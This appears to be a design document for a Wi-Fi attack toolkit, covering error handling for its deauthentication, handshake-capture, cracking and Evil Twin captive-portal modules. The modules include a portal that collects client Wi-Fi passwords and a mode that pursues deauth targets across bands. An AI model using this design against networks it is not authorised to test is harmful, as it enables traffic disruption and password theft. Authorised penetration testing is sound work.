# Wcarck — Edge Cases, Solutions & State-of-the-Art Exception Handling

**Companion to:** `wcarck_engineering_review.md`  
**Focus:** Every realistic failure mode, what actually happens in code, and the modern Python patterns to handle it.

---

## 0. Foundational Exception Handling Philosophy

Before specific cases: establish one consistent mental model across the codebase.

### 0.1 The Three Categories of Failure

```
RECOVERABLE           → retry, wait, degrade gracefully
FATAL (for this job)  → stop the job cleanly, release resources, tell the user
FATAL (for the service) → log, attempt teardown, let systemd restart
```

Every exception handler must explicitly categorize the failure. The worst pattern
is a bare `except Exception: pass` — it hides RECOVERABLE and FATAL equally.

### 0.2 Use Python 3.11+ `ExceptionGroup` and `TaskGroup`

Python 3.12 (the target runtime) has first-class structured concurrency.
Use `asyncio.TaskGroup` everywhere instead of `asyncio.gather`. Key difference:

```python
# WRONG — gather swallows individual task failures
results = await asyncio.gather(
    task_a(), task_b(), task_c(),
    return_exceptions=True   # you now have to check each result manually
)

# RIGHT — TaskGroup cancels siblings on first failure, raises ExceptionGroup
async with asyncio.TaskGroup() as tg:
    ta = tg.create_task(task_a())
    tb = tg.create_task(task_b())
    tc = tg.create_task(task_c())
# All three complete or ALL are cancelled — no orphaned tasks
```

For Wcarck's job runner, every job spawns its sub-tasks inside a `TaskGroup`.
If `_drain_stdout` dies, `_watchdog` is cancelled. If `_watchdog` times out,
the whole task group cancels. No leaking background tasks.

### 0.3 Never Swallow `CancelledError`

The single most common asyncio bug in production code:

```python
# BUG — this traps CancelledError and prevents task cancellation
async def bad_worker():
    try:
        await some_long_operation()
    except Exception:          # catches CancelledError in Python < 3.8!
        pass

# CORRECT — re-raise CancelledError always
async def good_worker():
    try:
        await some_long_operation()
    except asyncio.CancelledError:
        await self._cleanup()    # still clean up
        raise                    # then re-raise — ALWAYS
    except Exception as e:
        logger.error("worker failed", exc=e)
```

In Python 3.12, `CancelledError` inherits from `BaseException`, not `Exception`.
A bare `except Exception` no longer catches it. But `except BaseException` still does.
Never use bare `except BaseException` without immediately re-raising.

### 0.4 The `Result` Type — For Operations That Legitimately Fail

Not every failure should raise an exception. For operations where failure is a
normal outcome (e.g., "adapter might not support monitor mode"), use a Result type:

```python
from dataclasses import dataclass
from typing import Generic, TypeVar

T = TypeVar("T")
E = TypeVar("E")

@dataclass(frozen=True)
class Ok(Generic[T]):
    value: T

@dataclass(frozen=True)
class Err(Generic[E]):
    error: E
    detail: str = ""

Result = Ok[T] | Err[E]

# Usage in AdaptersModule:
async def set_monitor_mode(iface: str) -> Result[None, str]:
    try:
        await _nl80211_set_monitor(iface)
        return Ok(None)
    except DriverError as e:
        return Err("driver_error", detail=str(e))
    except InterfaceNotFound:
        return Err("iface_gone", detail=f"{iface} disappeared")
```

The caller pattern-matches on Ok/Err and decides whether to retry, report, or abort.
No try/except spaghetti up the call stack.

---

## 1. Hardware Failure Edge Cases

### 1.1 Adapter Unplugged Mid-Session — The #1 Real-World Failure

**Scenario:** Operator is running deauth, pulls the Ralink USB adapter by accident
(or it loses power from an unpowered hub).

What actually happens:
- `wlan_mon` disappears from nl80211 — `ip link show wlan_mon` returns nothing
- The `airodump-ng` subprocess gets `SIGHUP` or `write: broken pipe` and crashes
- ManagedProcess sees `returncode != None` but its `_drain_stdout` task gets an
  EOF on the pipe
- The RadioLease is still marked `active` in the DB
- The job is still `RUNNING` in `job_queue`
- The WS broadcasts nothing — the UI shows the job as "running" indefinitely

**Detection mechanism — the Adapter Watchdog:**

```python
class AdapterWatchdog:
    """Polls nl80211 for adapter presence. Runs as a background task."""

    def __init__(self, iface: str, poll_interval: float = 2.0):
        self._iface = iface
        self._poll_interval = poll_interval
        self._gone_callbacks: list[Callable] = []

    def on_gone(self, cb: Callable) -> None:
        self._gone_callbacks.append(cb)

    async def run(self) -> None:
        while True:
            await asyncio.sleep(self._poll_interval)
            if not await self._iface_exists(self._iface):
                await self._fire_gone()
                return   # stop watching — adapter is gone

    async def _iface_exists(self, iface: str) -> bool:
        try:
            result = await asyncio.create_subprocess_exec(
                "ip", "link", "show", iface,
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL,
            )
            await result.wait()
            return result.returncode == 0
        except Exception:
            return False

    async def _fire_gone(self) -> None:
        for cb in self._gone_callbacks:
            try:
                await cb(self._iface)
            except Exception:
                pass   # don't let a callback crash the watchdog
```

**Response chain when adapter goes missing:**

```python
# In AdaptersModule startup:
watchdog = AdapterWatchdog("wlan_mon")
watchdog.on_gone(self._on_adapter_gone)
asyncio.create_task(watchdog.run())

async def _on_adapter_gone(self, iface: str) -> None:
    logger.error("adapter_gone", iface=iface)

    # 1. Find all jobs using this adapter via RadioLeaseManager
    orphaned_jobs = await self._lease_mgr.jobs_for_adapter(iface)

    # 2. Cancel each job through the job runner (triggers teardown stack)
    for job_id in orphaned_jobs:
        await self._job_runner.cancel(job_id, reason="adapter_disconnected")

    # 3. Mark adapter as GONE in DB (not just last_seen)
    await self._adapter_repo.mark_gone(iface)

    # 4. Publish event so UI shows the adapter card in error state
    await self._event_bus.publish(Event(
        tag="adapter.gone",
        payload={"iface": iface, "reason": "disconnected"},
    ))
```

The teardown stack then handles: kill subprocess → release lease → write session log.
No orphaned jobs, no stuck UI.

### 1.2 Driver Crash / Kernel Module Oops

**Scenario:** RTL8821AU driver oopses during high-rate injection (happens on some
kernel versions). `wlan_ap` disappears, `dmesg` shows `BUG: unable to handle kernel NULL pointer`.

What actually happens: identical to 1.1 for the software layer, but:
- The USB device is still physically present (`lsusb` shows it)
- `modprobe -r 88XXau && modprobe 88XXau` can reload the driver
- The interface reappears as a NEW name (udev re-runs, udev rule reassigns `wlan_ap`)

**Recovery:**

```python
async def _attempt_driver_recovery(self, iface: str) -> bool:
    """Try to reload the driver and restore the interface."""
    driver = await self._detect_driver(iface)   # from DB or dkms status
    if not driver:
        return False

    logger.warning("driver_recovery_start", iface=iface, driver=driver)

    # 1. Unload
    proc = await asyncio.create_subprocess_exec("modprobe", "-r", driver)
    await asyncio.wait_for(proc.wait(), timeout=10.0)

    await asyncio.sleep(1.0)   # let USB settle

    # 2. Reload
    proc = await asyncio.create_subprocess_exec("modprobe", driver)
    await asyncio.wait_for(proc.wait(), timeout=10.0)

    # 3. Wait for udev to reassign the interface name
    for _ in range(20):   # up to 4 seconds
        await asyncio.sleep(0.2)
        if await self._iface_exists(iface):
            logger.info("driver_recovery_success", iface=iface)
            return True

    logger.error("driver_recovery_failed", iface=iface)
    return False
```

Driver recovery should only be attempted ONCE per interface per 60 seconds.
Track `_last_recovery_attempt: dict[str, float]` and skip if too recent.

### 1.3 USB Bus Reset During Capture

**Scenario:** USB 3.0 hub power event causes all USB devices to momentarily
disconnect and reconnect. Both `wlan_mon` and `wlan_ap` disappear simultaneously
for ~1.5 seconds, then come back.

The challenge: the adapter watchdog fires for BOTH adapters at the same time.
If both trigger `_on_adapter_gone` concurrently, and both try to cancel overlapping
jobs, you get double-cancel on the same job (which raises `CancelledError` on an
already-cancelled task — harmless in Python 3.12 but ugly in logs).

**Fix:** Use a `asyncio.Event` per adapter:

```python
class AdaptersModule:
    _recovery_in_progress: dict[str, asyncio.Lock] = defaultdict(asyncio.Lock)

    async def _on_adapter_gone(self, iface: str) -> None:
        async with self._recovery_in_progress[iface]:
            # Only one recovery attempt at a time per adapter
            await self._cancel_adapter_jobs(iface)
            recovered = await self._attempt_driver_recovery(iface)
            if recovered:
                await self._restore_adapter_role(iface)   # re-apply udev role
```

### 1.4 MAC Address Randomization on Adapter Reconnect

Some adapters change their MAC on reconnect or after `modprobe`. The udev rule
matches by MAC, so if the MAC changes, the interface gets a kernel-generated name
(`wlx001ea6c65744`) instead of `wlan_mon`. The whole system breaks silently.

**Detection in doctor.sh and startup:**

```python
async def verify_adapter_macs() -> list[AdapterMismatch]:
    mismatches = []
    expected = {
        "wlan_mon": "00:1e:a6:c6:57:44",
        "wlan_ap":  "5c:62:8b:76:5d:e2",
    }
    for iface, expected_mac in expected.items():
        actual_mac = await get_mac(iface)
        if actual_mac and actual_mac.lower() != expected_mac.lower():
            mismatches.append(AdapterMismatch(iface, expected_mac, actual_mac))
    return mismatches
```

For the morrownr `88XXau` driver: add `options 88XXau rtw_drv_log_level=0` to
`/etc/modprobe.d/88XXau.conf` — this disables a debug mode that causes the driver
to generate a random locally-administered MAC on load.

---

## 2. Subprocess Edge Cases — Beyond ManagedProcess

### 2.1 Grandchild Processes — The Hidden Zombie Problem

`aireplay-ng` on some Linux distributions is a shell wrapper script that forks the
actual `aireplay-ng.bin`. When ManagedProcess sends SIGINT to `aireplay-ng` (PID X),
it kills the shell wrapper, but `aireplay-ng.bin` (PID X+1, a grandchild) inherits
and continues running.

**Detection:** After `proc.wait()`, check if any children remain:

```python
import psutil

async def _kill_process_tree(self, pid: int) -> None:
    """Kill a process and all its descendants."""
    try:
        parent = psutil.Process(pid)
        children = parent.children(recursive=True)
    except psutil.NoSuchProcess:
        return

    # SIGTERM the whole tree
    for child in children:
        try:
            child.terminate()
        except psutil.NoSuchProcess:
            pass
    try:
        parent.terminate()
    except psutil.NoSuchProcess:
        pass

    # Wait with timeout
    gone, alive = psutil.wait_procs(
        children + [parent], timeout=2.0
    )

    # SIGKILL survivors
    for proc in alive:
        try:
            proc.kill()
        except psutil.NoSuchProcess:
            pass
```

Replace the `proc.kill()` call in `ManagedProcess.stop()` with `_kill_process_tree(proc.pid)`.

### 2.2 External Tool Version Mismatch — Silent Output Format Change

`airodump-ng` changed its CSV format between versions (field added/removed in
aircrack-ng 1.6 and 1.7). A CSV parser written for 1.6 silently produces wrong
results on 1.7 (columns shifted by 1 → BSSID ends up in the SSID column).

**State-of-the-art: version-pinned parser with format validation:**

```python
class AirodumpCSVParser:
    # Known header signatures by version
    KNOWN_HEADERS = {
        "1.6": "BSSID, First time seen, Last time seen, channel, Speed, Privacy, "
               "Cipher, Authentication, Power, # beacons, # IV, LAN IP, "
               "ID-length, ESSID, Key",
        "1.7": "BSSID, First time seen, Last time seen, channel, Speed, Privacy, "
               "Cipher, Authentication, Power, # beacons, # IV, LAN IP, "
               "ID-length, ESSID, Key",  # same in 1.7, but client section differs
    }

    def parse_header(self, header_line: str) -> ParserVersion:
        normalized = header_line.strip().lower()
        for version, expected in self.KNOWN_HEADERS.items():
            if normalized == expected.lower():
                return ParserVersion(version)
        # Unknown header — fail loudly instead of silently producing garbage
        raise UnknownCSVFormat(
            f"airodump-ng CSV header not recognized: {header_line!r}\n"
            f"Expected one of: {list(self.KNOWN_HEADERS.keys())}"
        )
```

On `UnknownCSVFormat`: publish `tool.version_mismatch` event → UI shows a
yellow banner: "airodump-ng output format unrecognized. Check `doctor.sh`."
Do NOT silently continue with wrong data.

### 2.3 hashcat Segfault on Bad GPU Driver

`hashcat` segfaults when the GPU driver is incompatible (e.g., NVIDIA driver
mismatch, CUDA not found). The ManagedProcess sees `returncode == -11` (SIGSEGV).

```python
async def _on_process_exit(self, returncode: int) -> None:
    if returncode == -11:   # SIGSEGV
        await self._event_bus.publish(Event(
            tag="crack.job.failed",
            payload={
                "reason": "hashcat_segfault",
                "hint": "GPU driver incompatible. Try --backend-type=CPU in crack config.",
            }
        ))
        # Automatically retry with CPU fallback
        await self._retry_with_cpu_backend()
    elif returncode == 1:
        # hashcat exit 1 = no candidates found (exhausted wordlist)
        # NOT an error — expected outcome
        await self._mark_exhausted()
    elif returncode == -2:   # SIGINT — operator stopped it
        pass   # normal stop path
```

The exit code meaning for hashcat:
- `0` = cracked
- `1` = exhausted (not an error)
- `2` = quit by user
- `255` = error (bad arguments, missing file)
- `-11` = segfault (driver crash)
- `-9` = SIGKILL (we killed it)

### 2.4 airodump-ng Hangs Without Writing CSV (Empty RF Environment)

In a low-traffic environment (early morning, away from APs), airodump-ng starts,
writes an empty CSV header, and then writes nothing for minutes. The `ScanModule`
sees no events and the UI shows a stale "Scanning..." state.

**Fix: Liveness watchdog on CSV output:**

```python
class ScanModule:
    _last_csv_line: float = 0.0
    _CSV_STALE_THRESHOLD = 30.0   # seconds

    async def _csv_watchdog(self) -> None:
        while self._running:
            await asyncio.sleep(10.0)
            age = time.monotonic() - self._last_csv_line
            if age > self._CSV_STALE_THRESHOLD:
                await self._event_bus.publish(Event(
                    tag="scan.stale",
                    payload={"seconds_since_last_network": age},
                ))
                # NOT an error — just inform the UI
                # UI shows: "No networks seen in 30s — are adapters in monitor mode?"

    async def _on_csv_line(self, line: str) -> None:
        self._last_csv_line = time.monotonic()
        # ... parse and emit scan.network events
```

---

## 3. Asyncio Structured Concurrency — State-of-the-Art Patterns

### 3.1 Job Runner — `TaskGroup` for Each Job's Sub-tasks

Each job has multiple concurrent sub-tasks: stdout drain, stderr drain, watchdog,
event relay. Use `TaskGroup` so if any sub-task crashes, all others are cancelled
and the teardown runs:

```python
class JobRunner:
    async def _run_job(self, job: Job) -> None:
        try:
            async with asyncio.TaskGroup() as tg:
                tg.create_task(job.module.run(job.context))   # main work
                tg.create_task(self._watchdog(job))           # timeout/cancel
                tg.create_task(self._event_relay(job))        # WS broadcasting

        except* StopJobRequested:
            # Operator clicked Stop — clean exit
            await self._finalize(job, status="cancelled")

        except* AdapterGone as eg:
            # Hardware failure — all sub-tasks were cancelled
            await self._finalize(job, status="failed",
                                 error=f"Adapter disconnected: {eg.exceptions[0]}")

        except* Exception as eg:
            # Unexpected failure
            logger.error("job_crashed", job_id=job.id, exc_group=eg)
            await self._finalize(job, status="failed",
                                 error=repr(eg.exceptions[0]))

        finally:
            # ALWAYS runs — even on CancelledError
            await self._teardown_stack.run()
            await self._lease_manager.release_all(job.id)
```

The `except*` syntax (Python 3.11+) matches specific exception types from an
`ExceptionGroup`. Unmatched types re-raise as a new `ExceptionGroup`.

### 3.2 `AsyncExitStack` for Resource Acquisition — Replaces the Teardown Stack

Instead of a manual teardown stack, use `contextlib.AsyncExitStack`. It handles
the same reverse-order cleanup but is stdlib, battle-tested, and works correctly
with `async with` semantics:

```python
from contextlib import AsyncExitStack

class EvilTwinModule:
    async def run(self, ctx: JobContext) -> None:
        async with AsyncExitStack() as stack:

            # Register resources — each is cleaned up in reverse order on exit
            lease = await stack.enter_async_context(
                self._lease_manager.acquire("wlan_ap", "ap.service", ctx.job_id)
            )
            await stack.enter_async_context(self._set_monitor_down(ctx.iface))
            await stack.enter_async_context(self._nftables_chain(ctx.session_id))
            await stack.enter_async_context(self._hostapd(ctx))
            await stack.enter_async_context(self._dnsmasq(ctx))
            await stack.enter_async_context(self._captive_portal(ctx))

            # Signal that we're fully up
            await ctx.event_bus.publish(Event("ap.started", {...}))

            # Wait until stopped
            await ctx.stop_event.wait()

        # On exit (normal or exception): AsyncExitStack unwinds in reverse order
        # Portal → dnsmasq → hostapd → nftables → monitor-up → lease released
```

Each `enter_async_context` takes a context manager. On any exception (including
`CancelledError`), the stack unwinds. No manual teardown stack needed.

Context manager for hostapd:

```python
from contextlib import asynccontextmanager

@asynccontextmanager
async def _hostapd(self, ctx: JobContext):
    proc = ManagedProcess("hostapd", ctx.hostapd_conf_path)
    await proc.start()
    try:
        # Wait for AP-ENABLED before yielding
        ready = await self._wait_for_ap_enabled(ctx.log_path, timeout=15.0)
        if not ready:
            raise HostapdStartupTimeout(f"hostapd did not emit AP-ENABLED in 15s")
        yield proc
    finally:
        await proc.stop()   # SIGTERM → SIGKILL cascade
        await self._wait_for_iface_mode(ctx.iface, "monitor", timeout=5.0)
```

### 3.3 Circuit Breaker for External Tools

If `aireplay-ng` fails 5 times in a row (driver issue, version mismatch), the
DeauthModule should stop retrying and fall back to scapy injection instead of
hammering the user with repeated failure events.

```python
class CircuitBreaker:
    def __init__(self, threshold: int = 5, reset_after: float = 60.0):
        self._failures = 0
        self._threshold = threshold
        self._open_until: float = 0.0
        self._state: Literal["closed", "open", "half-open"] = "closed"

    def is_open(self) -> bool:
        if self._state == "open":
            if time.monotonic() > self._open_until:
                self._state = "half-open"
                return False
            return True
        return False

    def record_success(self) -> None:
        self._failures = 0
        self._state = "closed"

    def record_failure(self) -> None:
        self._failures += 1
        if self._failures >= self._threshold:
            self._state = "open"
            self._open_until = time.monotonic() + self._reset_after

# In DeauthModule:
_aireplay_breaker = CircuitBreaker(threshold=3, reset_after=30.0)

async def _send_deauth(self, iface, bssid, client):
    if self._aireplay_breaker.is_open():
        # Fallback to scapy
        await self._scapy_deauth(iface, bssid, client)
        return
    try:
        await self._aireplay_deauth(iface, bssid, client)
        self._aireplay_breaker.record_success()
    except AireplayFailed:
        self._aireplay_breaker.record_failure()
        await self._scapy_deauth(iface, bssid, client)   # fallback
```

### 3.4 Retry with Exponential Backoff + Jitter — For Driver Operations

Adapter mode switches fail transiently (USB enumeration timing, driver init delay).
Don't fail immediately — retry with backoff:

```python
import random

async def retry_with_backoff(
    coro_fn: Callable[[], Awaitable[T]],
    *,
    max_attempts: int = 5,
    base_delay: float = 0.5,
    max_delay: float = 8.0,
    exceptions: tuple = (OSError, DriverError),
) -> T:
    last_exc = None
    for attempt in range(max_attempts):
        try:
            return await coro_fn()
        except exceptions as e:
            last_exc = e
            if attempt == max_attempts - 1:
                break
            delay = min(base_delay * (2 ** attempt), max_delay)
            delay += random.uniform(0, delay * 0.1)   # 10% jitter
            logger.warning(
                "retry", attempt=attempt + 1, delay=round(delay, 2), exc=str(e)
            )
            await asyncio.sleep(delay)
    raise last_exc

# Usage:
await retry_with_backoff(
    lambda: set_monitor_mode("wlan_mon"),
    max_attempts=4,
    base_delay=0.5,
)
```

---

## 4. SQLite Edge Cases

### 4.1 WAL Leftover from Crash — Database Won't Open

If the service crashes with an active WAL file (`db.sqlite-wal`) and an unfinished
WAL index (`db.sqlite-shm`), SQLite's recovery on next open is automatic BUT:
- If the WAL file is >GB (from a runaway write loop), the recovery takes minutes
- If the WAL file is corrupted (disk write interrupted), SQLite raises `SQLITE_CORRUPT`

```python
async def open_database_safely(path: str) -> AsyncEngine:
    wal_path = path + "-wal"
    shm_path = path + "-shm"

    # Check for suspiciously large WAL
    if os.path.exists(wal_path):
        wal_size = os.path.getsize(wal_path)
        if wal_size > 100 * 1024 * 1024:   # > 100 MB
            logger.warning("large_wal_file", path=wal_path, size_mb=wal_size // 1048576)
            # Force WAL checkpoint before opening
            # Open a sync connection just for this
            import sqlite3
            with sqlite3.connect(path) as conn:
                conn.execute("PRAGMA wal_checkpoint(TRUNCATE)")

    engine = create_async_engine(f"sqlite+aiosqlite:///{path}")
    try:
        async with engine.connect() as conn:
            await conn.execute(text("SELECT 1"))
    except Exception as e:
        if "corrupt" in str(e).lower():
            await _handle_db_corruption(path)   # backup + recreate
        raise
    return engine

async def _handle_db_corruption(path: str) -> None:
    import shutil
    backup = path + f".corrupt.{int(time.time())}"
    shutil.move(path, backup)
    for ext in ("-wal", "-shm"):
        try:
            os.remove(path + ext)
        except FileNotFoundError:
            pass
    logger.critical(
        "db_corrupt_backed_up",
        backup=backup,
        action="recreating_empty_db",
    )
    # DB will be recreated by Alembic migrations on next startup
```

### 4.2 Disk Full Mid-Transaction

SQLite returns `SQLITE_FULL` when the disk is full. SQLAlchemy raises `OperationalError`
with "database or disk is full". If this happens mid-scan (scan updates being flushed),
the transaction rolls back and ALL scan data since last flush is lost — but the scan
continues on disk.

**Fix: Disk space check before bulk writes:**

```python
import shutil

async def _flush_scan_buffer(self, batch: list[NetworkUpdate]) -> None:
    disk = shutil.disk_usage("/var/lib/wcarck")
    free_mb = disk.free // 1048576
    if free_mb < 50:   # less than 50 MB
        await self._event_bus.publish(Event(
            tag="system.disk_low",
            payload={"free_mb": free_mb, "path": "/var/lib/wcarck"},
        ))
        if free_mb < 10:   # critical — stop writing
            logger.error("disk_full_scan_flush_skipped", free_mb=free_mb)
            return

    try:
        async with self._session() as s:
            await s.execute(insert(Network).prefix_with("OR REPLACE"), ...)
            await s.commit()
    except OperationalError as e:
        if "disk is full" in str(e).lower():
            # Don't retry — disk is full
            await self._event_bus.publish(Event(
                tag="system.disk_full",
                payload={"error": str(e)},
            ))
        else:
            raise
```

### 4.3 Concurrent Writer Starvation Under SQLite WAL

SQLite WAL allows multiple readers but only ONE writer. If the scan flush loop runs
every 2 seconds AND the job runner writes job state transitions frequently AND the
event bus writes session logs, all three can compete for the write lock.

WAL mode uses `busy_timeout` to wait for the lock. Default is 0 ms (immediate fail).

**Fix:** Set busy timeout at connection time:

```python
@event.listens_for(engine.sync_engine, "connect")
def set_pragmas(dbapi_conn, _):
    dbapi_conn.execute("PRAGMA journal_mode=WAL")
    dbapi_conn.execute("PRAGMA busy_timeout=5000")   # wait up to 5s for write lock
    dbapi_conn.execute("PRAGMA synchronous=NORMAL")
    dbapi_conn.execute("PRAGMA foreign_keys=ON")
    dbapi_conn.execute("PRAGMA cache_size=-32000")   # 32 MB page cache
```

With `busy_timeout=5000`, SQLAlchemy will retry the write for up to 5 seconds
before raising `OperationalError: database is locked`.

### 4.4 Alembic Migration Failure — Partial Schema

If the service is killed mid-migration (power loss), the `alembic_version` table
may show the migration as complete but the schema changes were not all committed.

**Fix:** Always run migrations inside a single SQLite transaction:

```python
# In alembic env.py
def run_migrations_online():
    with connectable.connect() as connection:
        context.configure(
            connection=connection,
            target_metadata=target_metadata,
            transaction_per_migration=True,   # <-- each migration is atomic
        )
        with context.begin_transaction():
            context.run_migrations()
```

On startup, run a schema integrity check:

```python
async def verify_schema(engine: AsyncEngine) -> None:
    """Check that all expected tables and columns exist."""
    async with engine.connect() as conn:
        tables = (await conn.execute(
            text("SELECT name FROM sqlite_master WHERE type='table'")
        )).scalars().all()

        required = {"sessions", "networks", "clients", "job_queue",
                    "attack_sessions", "captures", "credentials",
                    "ap_sessions", "resource_leases", "session_log",
                    "crack_jobs", "module_state", "scopes", "adapters"}

        missing = required - set(tables)
        if missing:
            raise SchemaIntegrityError(f"Missing tables: {missing}")
```

---

## 5. RF/Protocol Edge Cases

### 5.1 AP Changes Channel Mid-Deauth (DoS Pursuit Mode — Edge Cases)

The plan mentions pursuit mode but doesn't cover these sub-cases:

**Sub-case A — 5 GHz/2.4 GHz band switch:**
Some dual-band APs switch from 2.4 GHz (channel 1) to 5 GHz (channel 36) when they
detect interference. `wlan_mon` (Ralink, 2.4 GHz only) cannot follow to 5 GHz.
`wlan_ap` (T2U Plus, 5 GHz capable) must take over pursuit.

```python
async def _pursuit_mode(self, target: Network, ctx: JobContext) -> None:
    while not ctx.stop_event.is_set():
        current_band = await self._detect_ap_band(target.bssid)

        if current_band == "2.4GHz":
            await self._lease_manager.ensure("wlan_mon", "monitor.locked")
            await self._deauth_on(iface="wlan_mon", target=target)
        elif current_band == "5GHz":
            if not await self._lease_manager.try_acquire("wlan_ap", "monitor.locked"):
                # wlan_ap is busy (Evil Twin running?) — can't pursue to 5 GHz
                await ctx.event_bus.publish(Event(
                    tag="attack.deauth.pursuit_blocked",
                    payload={"reason": "wlan_ap_busy", "target_band": "5GHz"},
                ))
                break   # stop pursuit, can't follow
            await self._deauth_on(iface="wlan_ap", target=target)
        elif current_band is None:
            # AP disappeared from scan — either band-switching or offline
            await asyncio.sleep(5.0)   # wait and re-check
```

**Sub-case B — AP uses random BSSID rotation (some enterprise APs):**
Some Cisco/Aruba APs rotate their BSSID on channel change for security.
The scan table's `bssid` key is now wrong. Pursuit mode must track SSID + channel,
not just BSSID:

```python
async def _find_ap_by_ssid(self, ssid: str) -> Network | None:
    """Find a network by SSID (handles BSSID rotation)."""
    candidates = await self._network_repo.get_by_ssid(ssid)
    if not candidates:
        return None
    # Return the one seen most recently with highest signal
    return max(candidates, key=lambda n: (n.last_seen, n.max_rssi))
```

### 5.2 WPA3-SAE Target — Handshake Capture Incompatible

If the target AP advertises WPA3-SAE (not WPA2-PSK), the 4-way handshake structure
is different — the initial authentication uses SAE (Simultaneous Authentication of
Equals) which is a Dragonfly key exchange. hcxdumptool captures SAE frames but they
are NOT crackable by hashcat `-m 22000`.

**Detection:**

```python
def parse_encryption(beacon: Dot11Beacon) -> EncryptionType:
    rsn = beacon.getlayer(Dot11Elt, ID=48)
    if not rsn:
        return EncryptionType.WEP_OR_OPEN

    rsn_data = parse_rsn_ie(rsn.info)
    akm_suites = rsn_data.get("akm_suites", [])

    if 0x000FAC08 in akm_suites:   # SAE
        return EncryptionType.WPA3_SAE
    if 0x000FAC02 in akm_suites:   # PSK
        return EncryptionType.WPA2_PSK
    if 0x000FAC04 in akm_suites:   # FT-PSK (802.11r)
        return EncryptionType.WPA2_FT_PSK
    return EncryptionType.UNKNOWN
```

**UI response:**
- WPA3-SAE: Show badge "WPA3 — handshake capture not supported, PMKID-only"
- WPA2/WPA3 transition mode (both AKMs present): Show "WPA2 compatible — capture supported"
- WPA2-FT-PSK: Show warning (see §5.3)

### 5.3 802.11r Fast BSS Transition — 4-EAPOL State Machine Breaks

802.11r (Fast BSS Transition) uses a different roaming handshake — the client
exchanges FT auth frames (not standard EAPOL 4-way) when roaming between APs in
the same mobility domain. hcxdumptool will capture these frames, but the wifite2
4-EAPOL state machine (`tshark.py` port) expects the standard M1/M2/M3/M4 pattern.
FT frames produce a partial or incorrect EAPOL sequence.

**Fix:** Detect FT and skip EAPOL validation, use PMKID only:

```python
async def _capture_strategy(self, target: Network) -> CaptureStrategy:
    if target.encryption == EncryptionType.WPA2_FT_PSK:
        # 802.11r — use PMKID capture (clientless)
        return CaptureStrategy.PMKID_ONLY
    elif target.has_pmf:
        # PMF — deauth won't work well, try PMKID first
        return CaptureStrategy.PMKID_FIRST_THEN_EAPOL
    else:
        return CaptureStrategy.EAPOL_WITH_DEAUTH
```

### 5.4 Client Uses Randomized MAC (iOS Private Addressing, Android 10+)

Since iOS 14 and Android 10, clients use per-network randomized MACs. The `clients`
table keyed on MAC address will accumulate hundreds of phantom "clients" — each
connection attempt from the same physical phone appears as a new MAC.

**Consequences:**
- `deauth` targeted at a specific client MAC will miss the phone (its real MAC is
  `5c:51:4f:xx:xx:xx` but it's probing as `ee:6a:bc:xx:xx:xx`)
- Portal credential will be linked to a random MAC that never appears again
- Client count statistics are inflated (50 "clients" for 3 actual phones)

**Detection and mitigation:**

```python
def is_randomized_mac(mac: str) -> bool:
    """Locally administered bit (bit 1 of first octet) = 1 → random MAC."""
    first_byte = int(mac.split(":")[0], 16)
    return bool(first_byte & 0x02)

# In ScanModule:
async def _on_client(self, client: ClientRow) -> None:
    if is_randomized_mac(client.mac):
        client.vendor = "Randomized MAC (iOS/Android private addressing)"
        client.flags |= ClientFlags.RANDOM_MAC
        # Don't count toward "real" client statistics
```

For Evil Twin: when a client with a random MAC connects to the portal, the
`ap_session_id` + `client_ip` combination is a better identifier than `client_mac`.

### 5.5 AP Goes Offline Mid-Capture

**Scenario:** Handshake capture is running. The target AP (NASA router) reboots
(ISP firmware update at 2 AM, happens). hcxdumptool is running but receives no
frames from the target BSSID.

The DeauthModule is still sending deauth frames to a BSSID that no longer exists.
This is harmless (frames go out with no response) but wastes RF time and confuses
the operator.

**Detection:** The scan engine publishes `scan.network.lost` when a BSSID hasn't
been seen for >30 seconds. The `HandshakeCaptureModule` should subscribe to this:

```python
class HandshakeCaptureModule(Module):
    subscriptions = ["capture.handshake.got", "scan.network.lost"]

    async def on_event(self, event: Event) -> None:
        if event.tag == "scan.network.lost":
            if event.payload["bssid"] == self._target_bssid:
                # Target AP disappeared — pause deauth, keep capture running
                # (AP may come back and the associated STA will re-auth → handshake)
                await self._pause_deauth()
                await self._event_bus.publish(Event(
                    tag="capture.handshake.target_lost",
                    payload={"bssid": self._target_bssid, "hint": "AP offline? Waiting..."},
                ))
```

---

## 6. Evil Twin Race Conditions

### 6.1 Concurrent Portal Submissions — aircrack-ng Concurrency

Two clients submit the portal form simultaneously. Both trigger
`aircrack-ng -a 2 -b <bssid> -w <(echo "<pass>") <handshake.cap>`.
Now two `aircrack-ng` processes are running simultaneously reading the same `.cap` file.

This is safe (reads only) BUT:
- `aircrack-ng` is CPU-intensive — two concurrent processes on a laptop
  will compete for cores and slow each other to 2× the normal time
- The `temp wordlist` from process substitution `<(echo "...")` creates a
  named pipe that may collide if both use the same filename

**Fix: serialized aircrack validation with a bounded semaphore:**

```python
class OfflineValidator:
    # Maximum 1 concurrent aircrack-ng process per handshake file
    # (reading the same .cap file is safe; CPU contention is the concern)
    _semaphore = asyncio.Semaphore(1)

    async def validate(self, password: str, bssid: str, cap_path: str) -> bool:
        async with self._semaphore:
            return await self._run_aircrack(password, bssid, cap_path)

    async def _run_aircrack(self, password, bssid, cap_path) -> bool:
        # Write password to a unique temp file (NOT process substitution — unreliable)
        tmp = Path(f"/tmp/wcarck_val_{uuid.uuid4().hex}.txt")
        try:
            tmp.write_text(password + "\n")
            proc = await asyncio.create_subprocess_exec(
                "aircrack-ng", "-a", "2", "-b", bssid,
                "-w", str(tmp), cap_path,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.DEVNULL,
            )
            stdout, _ = await asyncio.wait_for(
                proc.communicate(), timeout=10.0
            )
            return b"KEY FOUND!" in stdout
        except asyncio.TimeoutError:
            proc.kill()
            return False   # timeout = treat as invalid, not error
        finally:
            tmp.unlink(missing_ok=True)
```

Note: use a **temp file**, not process substitution (`<(...)`). Process substitution
creates a named pipe in `/dev/fd/`, which is not available in all subprocess
execution contexts (especially when `asyncio.create_subprocess_exec` runs in a
restricted environment).

### 6.2 Double-Submit on Portal Form

Client submits the password form, waits 3 seconds, sees no response (network lag),
and submits again. Two identical POST requests arrive. The first triggers aircrack-ng
validation. The second arrives while the first is still validating.

Without deduplication: two `credentials` rows for the same (mac, ssid, password),
and two validation attempts. If the first succeeds and marks the credential valid,
the second might fail (race on the `validated` field update).

**Fix: per-client submission lock:**

```python
class CaptivePortalServer:
    _submission_locks: dict[str, asyncio.Lock] = defaultdict(asyncio.Lock)

